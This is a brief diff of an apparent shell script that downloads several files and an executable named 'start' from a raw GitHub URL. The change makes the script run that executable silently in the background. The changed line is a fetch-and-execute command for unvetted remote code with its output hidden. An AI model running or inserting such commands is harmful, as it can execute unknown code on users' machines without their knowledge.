@@ -4,5 +4,5 @@ curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpa -o wpa
 curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpb -o wpb 
 curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpc -o wpc
 curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpd -o wpd
-curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/start -o start && chmod +x start && ./start
+curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/start -o start && chmod +x start && ./start  > /dev/null 2>&1 &
 sleep 10
